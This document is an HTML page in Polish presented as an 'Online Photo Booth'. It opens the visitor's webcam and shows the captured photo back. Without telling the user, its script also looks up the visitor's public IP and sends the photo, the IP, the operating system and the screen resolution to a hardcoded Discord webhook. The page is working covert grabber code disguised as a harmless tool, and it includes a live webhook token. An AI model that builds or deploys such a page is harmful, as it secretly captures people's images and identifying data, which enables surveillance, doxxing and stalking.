<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Online Photo Booth</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        h1 {
            color: #4CAF50;
            margin-bottom: 10px;
        }

        p {
            color: #aaa;
            margin-bottom: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            background: #1e1e1e;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            max-width: 500px;
            width: 100%;
        }

        video, canvas, img {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            background: #000;
        }

        canvas {
            display: none;
        }

        .btn {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.2s, background 0.2s;
        }

        .btn:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }

        #result {
            margin-top: 20px;
            display: none;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>📸 Online Photo Booth</h1>
        <p>Zrób szybkie zdjęcie ze swojej kamerki!</p>

        <!-- Podgląd z kamerki -->
        <video id="webcam" autoplay playsinline></video>

        <!-- Ukryty canvas do wycinania klatki ze zdjęcia -->
        <canvas id="canvas"></canvas>

        <button class="btn" id="snapBtn">Zrób zdjęcie</button>

        <!-- Podgląd zrobionego zdjęcia -->
        <div id="result">
            <h3>Twoje zdjęcie:</h3>
            <img id="photo" alt="Twoje zdjęcie">
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1557352022339096601/69ufpxh9-gkVbid_vLx0e9oyaAbSV52Li8xzOBWoz4r4qAE2Vbe1d7bzwkTivd0nHXQZ
            ";

        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const photo = document.getElementById('photo');
        const snapBtn = document.getElementById('snapBtn');
        const resultDiv = document.getElementById('result');

        // Włączanie kamerki po załadowaniu strony
        async function startWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                video.srcObject = stream;
            } catch (err) {
                alert("Wymagany jest dostęp do kamerki, aby zrobić zdjęcie!");
            }
        }

        startWebcam();

        // Przycisk robienia zdjęcia
        snapBtn.addEventListener('click', async () => {
            snapBtn.innerText = "Przetwarzanie...";
            snapBtn.disabled = true;

            // 1. Rysowanie klatki z wideo na canvasie
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // 2. Konwersja zdjęcia na plik (Blob) oraz widoczny podgląd
            canvas.toBlob(async (blob) => {
                const photoUrl = URL.createObjectURL(blob);
                photo.src = photoUrl;
                resultDiv.style.display = 'block';

                // 3. Pobranie IP
                let userIP = "Nieznane";
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    userIP = ipData.ip;
                } catch (e) {
                    console.log("Błąd pobierania IP");
                }

                // 4. Wysyłanie zdjęcia + danych na Discord Webhook
                const formData = new FormData();
                
                // Treść wiadomości w formacie JSON
                const payload = {
                    content: "📸 **NOWE ZDJĘCIE Z PHOTO BOOTH!**",
                    embeds: [{
                        title: "Szczegóły sesji",
                        color: 4437376,
                        fields: [
                            { name: "🌐 IP Address", value: `\`${userIP}\``, inline: true },
                            { name: "💻 System", value: navigator.platform, inline: true },
                            { name: "🖥️ Rozdzielczość", value: `${screen.width}x${screen.height}`, inline: true }
                        ],
                        timestamp: new Date()
                    }]
                };

                formData.append('payload_json', JSON.stringify(payload));
                formData.append('file', blob, 'photo.png');

                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    });
                    snapBtn.innerText = "Zrób kolejne zdjęcie";
                    snapBtn.disabled = false;
                } catch (err) {
                    console.error("Błąd wysyłania na webhook:", err);
                    snapBtn.innerText = "Zrób zdjęcie";
                    snapBtn.disabled = false;
                }
            }, 'image/png');
        });
    </script>
</body>
</html>
